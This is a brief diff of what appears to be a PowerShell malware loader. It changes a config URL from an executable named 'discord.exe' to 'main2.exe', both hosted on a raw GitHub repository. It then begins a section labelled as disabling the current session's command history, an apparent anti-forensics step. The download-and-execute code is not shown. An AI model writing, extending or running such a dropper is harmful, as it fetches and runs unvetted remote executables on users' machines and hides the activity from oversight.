@@ -1,5 +1,5 @@
 # ===== CONFIG =====
-$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"
+$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"
 
 # ===== DISABLE CURRENT SESSION HISTORY =====
 try {
